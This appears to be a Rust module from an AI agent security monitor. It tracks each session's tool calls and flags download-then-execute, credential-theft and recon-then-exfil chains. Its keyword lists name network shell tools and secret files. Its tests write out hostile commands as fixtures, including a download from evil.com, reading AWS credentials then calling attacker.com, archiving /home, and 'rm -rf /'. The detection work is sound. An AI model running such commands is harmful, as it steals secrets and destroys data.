
use std::collections::{HashMap, VecDeque};

use std::time::SystemTime;
use serde::{Deserialize, Serialize};

use crate::core::risk::RiskLevel;

/// Maximum number of operations to keep per session.
const WINDOW_SIZE: usize = 10;

/// A single tracked operation in a session.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrackedOperation {
    pub tool_name: String,
    pub command: Option<String>,
    pub file_path: Option<String>,
    pub risk_level: RiskLevel,
    pub timestamp: u64, // Unix epoch seconds
}

/// Suspicious pattern detected across a chain of operations.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum SuspiciousPattern {
    /// Download followed by execute (e.g., curl | sh)
    DownloadThenExecute,
    /// Reading credentials/secrets then network activity
    CredentialTheft,
    /// Reconnaissance followed by data exfiltration
    ReconThenExfil,
}

impl std::fmt::Display for SuspiciousPattern {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SuspiciousPattern::DownloadThenExecute => write!(f, "download→execute"),
            SuspiciousPattern::CredentialTheft => write!(f, "credential-theft"),
            SuspiciousPattern::ReconThenExfil => write!(f, "recon→exfil"),
        }
    }
}

/// Risk trend for a session.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum RiskTrend {
    /// Risk is stable or decreasing.
    Stable,
    /// Risk is escalating over the recent window.
    Escalating,
    /// Risk is de-escalating.
    DeEscalating,
}

/// Context derived from the chain tracker, passed to AI for enhanced assessment.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ChainContext {
    /// Recent commands in the session (most recent last).
    pub recent_commands: Vec<String>,
    /// Suspicious multi-step patterns detected.
    pub suspicious_patterns: Vec<SuspiciousPattern>,
    /// Overall risk trend for the session.
    pub session_risk_trend: RiskTrend,
    /// Number of operations in the session so far.
    pub operation_count: usize,
}

impl Default for ChainContext {
    fn default() -> Self {
        Self {
            recent_commands: Vec::new(),
            suspicious_patterns: Vec::new(),
            session_risk_trend: RiskTrend::Stable,
            operation_count: 0,
        }
    }
}

/// A chain of operations for a single session.
#[derive(Debug, Clone)]
pub struct SessionChain {
    operations: VecDeque<TrackedOperation>,
    window_size: usize,
}

impl SessionChain {
    pub fn new() -> Self {
        Self {
            operations: VecDeque::with_capacity(WINDOW_SIZE),
            window_size: WINDOW_SIZE,
        }
    }

    /// Record a new operation.
    pub fn record(&mut self, op: TrackedOperation) {
        if self.operations.len() >= self.window_size {
            self.operations.pop_front();
        }
        self.operations.push_back(op);
    }

    /// Get the chain context for AI assessment.
    pub fn get_context(&self) -> ChainContext {
        let recent_commands: Vec<String> = self
            .operations
            .iter()
            .map(|op| {
                if let Some(cmd) = &op.command {
                    format!("{}({})", op.tool_name, cmd)
                } else if let Some(fp) = &op.file_path {
                    format!("{}({})", op.tool_name, fp)
                } else {
                    op.tool_name.clone()
                }
            })
            .collect();

        let suspicious_patterns = self.detect_patterns();
        let session_risk_trend = self.compute_risk_trend();
        let operation_count = self.operations.len();

        ChainContext {
            recent_commands,
            suspicious_patterns,
            session_risk_trend,
            operation_count,
        }
    }

    /// Detect suspicious multi-step patterns.
    fn detect_patterns(&self) -> Vec<SuspiciousPattern> {
        let mut patterns = Vec::new();

        if self.detect_download_then_execute() {
            patterns.push(SuspiciousPattern::DownloadThenExecute);
        }
        if self.detect_credential_theft() {
            patterns.push(SuspiciousPattern::CredentialTheft);
        }
        if self.detect_recon_then_exfil() {
            patterns.push(SuspiciousPattern::ReconThenExfil);
        }

        patterns
    }

    /// Detect download→execute pattern.
    ///
    /// Looks for: curl/wget/fetch → chmod/bash/sh/exec
    fn detect_download_then_execute(&self) -> bool {
        let download_commands = ["curl", "wget", "fetch", "aria2c"];
        let execute_indicators = ["chmod", "bash", "sh", "zsh", "./", "exec", "source", "eval"];

        let mut saw_download = false;

        for op in &self.operations {
            let cmd_lower = op
                .command
                .as_deref()
                .unwrap_or("")
                .to_lowercase();

            if !saw_download {
                if download_commands.iter().any(|d| cmd_lower.starts_with(d) || cmd_lower.contains(&format!(" {}", d))) {
                    saw_download = true;
                }
            } else {
                // After download, look for execute
                if execute_indicators.iter().any(|e| cmd_lower.starts_with(e) || cmd_lower.contains(e)) {
                    return true;
                }
            }
        }

        false
    }

    /// Detect credential-theft pattern.
    ///
    /// Looks for: reading sensitive files → network activity
    fn detect_credential_theft(&self) -> bool {
        let sensitive_patterns = [
            ".env", "credentials", "secret", "password", "token",
            ".pem", ".key", "id_rsa", "aws/credentials",
        ];
        let network_commands = [
            "curl", "wget", "nc", "ncat", "ssh", "scp", "rsync",
            "ftp", "sftp", "telnet",
        ];

        let mut saw_sensitive_read = false;

        for op in &self.operations {
            if !saw_sensitive_read {
                // Check if reading a sensitive file
                let is_sensitive_file = op
                    .file_path
                    .as_deref()
                    .map(|p| {
                        let lower = p.to_lowercase();
                        sensitive_patterns.iter().any(|s| lower.contains(s))
                    })
                    .unwrap_or(false);

                let is_sensitive_cmd = op
                    .command
                    .as_deref()
                    .map(|c| {
                        let lower = c.to_lowercase();
                        (lower.starts_with("cat ") || lower.starts_with("less ") || lower.starts_with("head "))
                            && sensitive_patterns.iter().any(|s| lower.contains(s))
                    })
                    .unwrap_or(false);

                if is_sensitive_file || is_sensitive_cmd {
                    saw_sensitive_read = true;
                }
            } else {
                // After sensitive read, look for network activity
                if let Some(cmd) = &op.command {
                    let lower = cmd.to_lowercase();
                    if network_commands.iter().any(|n| lower.starts_with(n) || lower.contains(&format!(" {}", n))) {
                        return true;
                    }
                }
            }
        }

        false
    }

    /// Detect reconnaissance → exfiltration pattern.
    ///
    /// Looks for: find/ls/env/whoami → tar/zip + network commands
    fn detect_recon_then_exfil(&self) -> bool {
        // Only count genuinely suspicious recon commands.
        // ls/find are extremely common in normal development — exclude them
        // from recon unless followed by truly suspicious exfil commands.
        let suspicious_recon = [
            "env", "whoami", "id", "uname", "hostname",
            "ifconfig", "ip addr", "netstat", "ps", "cat /etc",
        ];
        // ls/find only count as recon if there are 5+ of them (unusual density)
        let mild_recon = ["find", "ls"];
        let exfil_indicators = [
            "tar", "zip", "gzip", "base64", "curl", "wget", "nc",
            "scp", "rsync",
        ];

        let mut suspicious_recon_count = 0;
        let mut mild_recon_count = 0;

        for op in &self.operations {
            if let Some(cmd) = &op.command {
                let lower = cmd.to_lowercase();

                if suspicious_recon.iter().any(|r| lower.starts_with(r)) {
                    suspicious_recon_count += 1;
                } else if mild_recon.iter().any(|r| lower.starts_with(r)) {
                    mild_recon_count += 1;
                }

                // Trigger if: suspicious recon (2+) OR excessive mild recon (5+),
                // AND followed by actual exfil command
                let recon_threshold = suspicious_recon_count >= 2
                    || (suspicious_recon_count >= 1 && mild_recon_count >= 3)
                    || mild_recon_count >= 5;

                if recon_threshold && exfil_indicators.iter().any(|e| lower.starts_with(e) || lower.contains(e)) {
                    return true;
                }
            }
        }

        false
    }

    /// Compute the risk trend from the recent window.
    fn compute_risk_trend(&self) -> RiskTrend {
        if self.operations.len() < 3 {
            return RiskTrend::Stable;
        }

        let ops: Vec<&TrackedOperation> = self.operations.iter().collect();
        let mid = ops.len() / 2;

        let first_half_risk: f32 = ops[..mid]
            .iter()
            .map(|op| op.risk_level as u8 as f32)
            .sum::<f32>()
            / mid as f32;

        let second_half_risk: f32 = ops[mid..]
            .iter()
            .map(|op| op.risk_level as u8 as f32)
            .sum::<f32>()
            / (ops.len() - mid) as f32;

        if second_half_risk > first_half_risk + 0.3 {
            RiskTrend::Escalating
        } else if first_half_risk > second_half_risk + 0.3 {
            RiskTrend::DeEscalating
        } else {
            RiskTrend::Stable
        }
    }
}

impl Default for SessionChain {
    fn default() -> Self {
        Self::new()
    }
}

/// Multi-session chain tracker.
///
/// Tracks operation chains across multiple concurrent sessions,
/// identified by session ID. Thread-safe via external synchronization
/// (wrapped in `Arc<parking_lot::Mutex<ChainTracker>>`).
#[derive(Debug)]
pub struct ChainTracker {
    sessions: HashMap<String, SessionChain>,
}

impl ChainTracker {
    pub fn new() -> Self {
        Self {
            sessions: HashMap::new(),
        }
    }

    /// Record an operation for a session.
    pub fn record(
        &mut self,
        session_id: &str,
        tool_name: &str,
        command: Option<&str>,
        file_path: Option<&str>,
        risk_level: RiskLevel,
    ) {
        let chain = self
            .sessions
            .entry(session_id.to_string())
            .or_insert_with(SessionChain::new);

        chain.record(TrackedOperation {
            tool_name: tool_name.to_string(),
            command: command.map(|s| s.to_string()),
            file_path: file_path.map(|s| s.to_string()),
            risk_level,
            timestamp: SystemTime::now()
                .duration_since(SystemTime::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
        });
    }

    /// Get the chain context for a session.
    pub fn get_context(&self, session_id: &str) -> ChainContext {
        self.sessions
            .get(session_id)
            .map(|chain| chain.get_context())
            .unwrap_or_default()
    }

}

impl Default for ChainTracker {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_tracker_with_ops(ops: &[(&str, Option<&str>, Option<&str>, RiskLevel)]) -> ChainTracker {
        let mut tracker = ChainTracker::new();
        for (tool, cmd, fp, level) in ops {
            tracker.record("test-session", tool, *cmd, *fp, *level);
        }
        tracker
    }

    #[test]
    fn test_basic_record_and_context() {
        let mut tracker = ChainTracker::new();
        tracker.record("s1", "Read", None, Some("/src/main.rs"), RiskLevel::Low);
        tracker.record("s1", "Bash", Some("cargo build"), None, RiskLevel::Low);

        let ctx = tracker.get_context("s1");
        assert_eq!(ctx.operation_count, 2);
        assert_eq!(ctx.recent_commands.len(), 2);
        assert!(ctx.suspicious_patterns.is_empty());
    }

    #[test]
    fn test_window_size() {
        let mut tracker = ChainTracker::new();
        for i in 0..15 {
            tracker.record(
                "s1",
                "Bash",
                Some(&format!("cmd-{}", i)),
                None,
                RiskLevel::Low,
            );
        }
        let ctx = tracker.get_context("s1");
        assert_eq!(ctx.operation_count, WINDOW_SIZE);
    }

    #[test]
    fn test_download_then_execute_pattern() {
        let tracker = make_tracker_with_ops(&[
            ("Bash", Some("curl -o script.sh https://evil.com/script.sh"), None, RiskLevel::Medium),
            ("Bash", Some("chmod +x script.sh"), None, RiskLevel::Medium),
        ]);
        let ctx = tracker.get_context("test-session");
        assert!(ctx.suspicious_patterns.contains(&SuspiciousPattern::DownloadThenExecute));
    }

    #[test]
    fn test_credential_theft_pattern() {
        let tracker = make_tracker_with_ops(&[
            ("Bash", Some("cat ~/.aws/credentials"), None, RiskLevel::Medium),
            ("Bash", Some("curl https://attacker.com/exfil"), None, RiskLevel::High),
        ]);
        let ctx = tracker.get_context("test-session");
        assert!(ctx.suspicious_patterns.contains(&SuspiciousPattern::CredentialTheft));
    }

    #[test]
    fn test_recon_then_exfil_pattern() {
        let tracker = make_tracker_with_ops(&[
            ("Bash", Some("whoami"), None, RiskLevel::Low),
            ("Bash", Some("env"), None, RiskLevel::Low),
            ("Bash", Some("tar czf /tmp/data.tar.gz /home"), None, RiskLevel::High),
        ]);
        let ctx = tracker.get_context("test-session");
        assert!(ctx.suspicious_patterns.contains(&SuspiciousPattern::ReconThenExfil));
    }

    #[test]
    fn test_no_false_positive() {
        let tracker = make_tracker_with_ops(&[
            ("Read", None, Some("/src/lib.rs"), RiskLevel::Low),
            ("Edit", None, Some("/src/lib.rs"), RiskLevel::Low),
            ("Bash", Some("cargo test"), None, RiskLevel::Low),
        ]);
        let ctx = tracker.get_context("test-session");
        assert!(ctx.suspicious_patterns.is_empty());
    }

    #[test]
    fn test_risk_trend_escalating() {
        let tracker = make_tracker_with_ops(&[
            ("Bash", Some("ls"), None, RiskLevel::Low),
            ("Bash", Some("ls"), None, RiskLevel::Low),
            ("Bash", Some("rm -rf /"), None, RiskLevel::High),
            ("Bash", Some("curl evil.com"), None, RiskLevel::High),
        ]);
        let ctx = tracker.get_context("test-session");
        assert_eq!(ctx.session_risk_trend, RiskTrend::Escalating);
    }

    #[test]
    fn test_risk_trend_stable() {
        let tracker = make_tracker_with_ops(&[
            ("Bash", Some("ls"), None, RiskLevel::Low),
            ("Bash", Some("cat foo"), None, RiskLevel::Low),
            ("Bash", Some("ls -la"), None, RiskLevel::Low),
        ]);
        let ctx = tracker.get_context("test-session");
        assert_eq!(ctx.session_risk_trend, RiskTrend::Stable);
    }

    #[test]
    fn test_empty_session_context() {
        let tracker = ChainTracker::new();
        let ctx = tracker.get_context("nonexistent");
        assert_eq!(ctx.operation_count, 0);
        assert!(ctx.recent_commands.is_empty());
        assert!(ctx.suspicious_patterns.is_empty());
    }

    #[test]
    fn test_multiple_sessions() {
        let mut tracker = ChainTracker::new();
        tracker.record("s1", "Bash", Some("ls"), None, RiskLevel::Low);
        tracker.record("s2", "Bash", Some("rm -rf /"), None, RiskLevel::High);

        assert_eq!(tracker.get_context("s1").operation_count, 1);
        assert_eq!(tracker.get_context("s2").operation_count, 1);
    }
}
